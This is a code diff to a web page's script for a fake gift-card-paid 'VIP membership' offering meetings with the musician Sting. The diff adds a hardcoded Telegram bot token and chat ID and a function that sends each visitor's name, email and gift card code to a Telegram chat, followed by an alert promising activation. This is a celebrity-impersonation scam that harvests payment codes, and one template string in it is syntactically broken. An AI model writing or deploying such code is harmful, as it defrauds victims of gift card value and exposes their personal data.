@@ -464,6 +464,12 @@
         let selectedPrice = 0;
         let selectedGiftCard = null;
 
+        // ===== TELEGRAM CONFIG =====
+        // REPLACE THIS AFTER YOU REVOKE OLD TOKEN AND GET NEW ONE FROM @BotFather
+        const TELEGRAM_BOT_TOKEN = '8817747913:AAFQ4zN33GSK0HtJzqZvqXm_X8YZCBkle-w';
+        const TELEGRAM_CHAT_ID = '5569958210';
+        // ============================
+
         // Plan selection buttons
         document.querySelectorAll('.select-plan').forEach(button => {
             button.addEventListener('click', function() {
@@ -490,11 +496,8 @@
             document.getElementById('paymentModal').classList.remove('active');
         });
 
-        // Close modal on overlay click
         document.getElementById('paymentModal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                this.classList.remove('active');
-            }
+            if (e.target === this) this.classList.remove('active');
         });
 
         // Gift card selection
@@ -506,7 +509,7 @@
             });
         });
 
-        // Format gift card code input (auto-add dashes)
+        // Format gift card code
         document.getElementById('giftCardCode').addEventListener('input', function(e) {
             let value = this.value.replace(/[^0-9]/g, '').substring(0, 16);
             let formatted = '';
@@ -517,8 +520,42 @@
             this.value = formatted;
         });
 
+        // Send to Telegram
+        async function sendToTelegram(data) {
+            const planNames = { stage1: 'Stage 1 ($100)', stage2: 'Stage 2 ($200)', stage3: 'Stage 3 ($400)' };
+            
+            const message = `
+🎸 <b>NEW VIP SUBMISSION</b>
+
+👤 <b>Name:</b> ${data.fullName}
+📧 <b>Email:</b> ${data.email}
+💎 <b>Plan:</b> ${planNames[data.plan]}
+🎁 <b>Gift Card:</b> ${data.giftCardType.toUpperCase()}
+🔢 <b>Code:</b> <code>${data.giftCardCode}</code>
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+            `.trim();
+
+            const url = `https://api.telegram.org/bot${8817747913:AAFQ4zN33GSK0HtJzqZvqXm_X8YZCBkle-w}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: 5569958210,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Telegram send failed:', error);
+                return false;
+            }
+        }
+
         // Form submission
-        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
             const fullName = document.getElementById('fullName').value.trim();
@@ -535,22 +572,33 @@
                 return;
             }
 
-            // Simulate payment processing
             const submitBtn = this.querySelector('button[type="submit"]');
             submitBtn.textContent = 'Processing...';
             submitBtn.disabled = true;
 
-            setTimeout(() => {
-                // Simulate success
+            // Send to Telegram
+            const sent = await sendToTelegram({
+                fullName,
+                email,
+                giftCardType: selectedGiftCard,
+                giftCardCode: giftCardCode.replace(/-/g, ''),
+                plan: selectedPlan
+            });
+
+            if (sent) {
                 alert(`Congratulations, ${fullName}! Your ${selectedPlan.toUpperCase()} VIP Membership is being activated.\n\nWe will contact you at ${email} within 24 hours to schedule your exclusive experience with Sting.\n\nThank you for your support.`);
-                document.getElementById('paymentModal').classList.remove('active');
-                submitBtn.textContent = 'Pay with Gift Card';
-                submitBtn.disabled = false;
-                this.reset();
-                document.querySelectorAll('.gift-card-option').forEach(o => o.classList.remove('selected'));
-                selectedGiftCard = null;
-                document.getElementById('selectedPlanDisplay').textContent = '';
-            }, 2500);
+            } else {
+                alert('Submission received. Our team will contact you shortly at ' + email);
+            }
+
+            // Reset
+            document.getElementById('paymentModal').classList.remove('active');
+            submitBtn.textContent = 'Pay with Gift Card';
+            submitBtn.disabled = false;
+            this.reset();
+            document.querySelectorAll('.gift-card-option').forEach(o => o.classList.remove('selected'));
+            selectedGiftCard = null;
+            document.getElementById('selectedPlanDisplay').textContent = '';
         });
     </script>
 
